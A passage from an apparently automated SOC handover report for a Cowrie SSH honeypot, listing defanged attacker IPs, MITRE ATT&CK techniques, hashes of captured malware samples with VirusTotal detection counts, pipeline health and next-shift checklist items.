> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.138[.]178` | **68** | 2026-06-11 21:53 | 2026-06-11 22:09 | 121m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.121[.]78` | **27** | 2026-06-11 20:57 | 2026-06-11 21:40 | 44m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.211.138[.]165` | **17** | 2026-06-11 21:25 | 2026-06-11 21:31 | 30m | 0 | `T1592` | 🟠 MEDIUM |
| `34.175.118[.]185` | **16** | 2026-06-11 22:45 | 2026-06-11 23:23 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.120.171[.]95` | **9** | 2026-06-11 20:26 | 2026-06-11 20:34 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `128.199.25[.]179` | **8** | 2026-06-11 20:29 | 2026-06-11 22:42 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]80` | **6** | 2026-06-11 20:43 | 2026-06-11 21:09 | 10m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `170.80.65[.]140` | **6** | 2026-06-11 20:27 | 2026-06-11 20:38 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `41.93.28[.]23` | **5** | 2026-06-11 20:48 | 2026-06-11 20:58 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `176.118.22[.]128` | **2** | 2026-06-11 20:53 | 2026-06-11 21:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `188.157.143[.]122` | **2** | 2026-06-11 20:34 | 2026-06-11 20:34 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `1.183.52[.]179` | 1 | 2026-06-11 23:09 | 2026-06-11 23:09 | 14s | 0 | `T1592` | 🟢 LOW |
| `103.101.216[.]26` | 1 | 2026-06-11 23:17 | 2026-06-11 23:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.155.221[.]74` | 1 | 2026-06-11 20:41 | 2026-06-11 20:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.248.239[.]230` | 1 | 2026-06-11 21:01 | 2026-06-11 21:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.152.102[.]54` | 1 | 2026-06-11 20:42 | 2026-06-11 20:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `121.227.31[.]13` | 1 | 2026-06-11 20:42 | 2026-06-11 20:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.187.229[.]247` | 1 | 2026-06-11 21:18 | 2026-06-11 21:18 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.148[.]79` | 1 | 2026-06-11 22:17 | 2026-06-11 22:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.12.109[.]162` | 1 | 2026-06-11 21:14 | 2026-06-11 21:14 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]89` | 1 | 2026-06-11 23:24 | 2026-06-11 23:24 | 1s | 0 | `T1592` | 🟢 LOW |
| `5.29.134[.]31` | 1 | 2026-06-11 20:47 | 2026-06-11 20:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `60.175.67[.]66` | 1 | 2026-06-11 23:09 | 2026-06-11 23:10 | 14s | 0 | `T1592` | 🟢 LOW |
| `62.16.103[.]46` | 1 | 2026-06-11 22:29 | 2026-06-11 22:29 | 9s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-06-11 23:14 | 2026-06-11 23:14 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.146.248[.]7` | JP | Google LLC | **100** ⚠️ | 50 |
| `195.96.139[.]89` | GB | Driftnet Ltd | **100** ⚠️ | 2 |
| `119.152.102[.]54` | PK | Pakistan Telecommunication Company Limited | **100** ⚠️ | 50 |
| `122.187.229[.]247` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 50 |
| `190.12.109[.]162` | AR | CPS | **100** ⚠️ | 50 |
| `60.175.67[.]66` | CN | CHINANET anhui province network | **100** ⚠️ | 36 |
| `5.29.134[.]31` | IL | BROADBAND | **100** ⚠️ | 1 |
| `103.101.216[.]26` | ID | PT Duta Trans Nusantara Network | **100** ⚠️ | 10 |
| `170.80.65[.]140` | BR | BTT TELECOMUNICACOES S.A. | **100** ⚠️ | 50 |
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 155 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 57 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 43 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 235 cases |
| Tool 34  | Credential Extractor        | ✅ 100 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (5.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 43 priority case(s) shown individually · 25 recon entry/entries in table (11 group(s) consolidating 166 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-11T23:27:38Z_
